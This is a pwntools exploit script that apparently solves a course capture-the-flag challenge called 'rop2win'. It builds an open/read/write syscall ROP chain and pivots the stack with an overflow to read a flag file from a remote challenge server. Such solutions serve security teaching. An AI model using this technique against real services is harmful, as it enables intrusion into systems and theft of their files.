from pwn import *

context.arch = "amd64"
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./rop2win")
rop = ROP(elf)
# io = gdb.debug("./rop2win", "b *(main+393)\nc")
# io = process("./rop2win")
io = remote("edu-ctf.zoolab.org", 30204)

pop_rax = rop.find_gadget(["pop rax", "ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
syscall_ret = rop.find_gadget(["syscall", "ret"]).address


def syscall(rax, rdi, rsi, rdx):
    return [pop_rax, rax, pop_rdi, rdi, pop_rsi, rsi, pop_rdx, rdx, syscall_ret]


buf = elf.sym["fn"]
rop_addr = elf.sym["ROP"]
leave_ret = rop.find_gadget(["leave", "ret"]).address

chain = []
# chain += syscall(0, 0, buf, 9)  # if we don't already have filename in memory
chain += syscall(2, buf, 0, 0)
chain += syscall(0, 3, buf, 100)
chain += syscall(1, 1, buf, 100)
payload = flat(chain)
payload += b"a" * (0x100 - len(payload))


io.sendafter(b"Give me filename: ", b"/home/rop2win/flag")
io.sendafter(b"Give me ROP: ", payload)
io.sendafter(b"Give me overflow: ", b"a" * 32 + flat([rop_addr - 8, leave_ret]))

io.interactive()
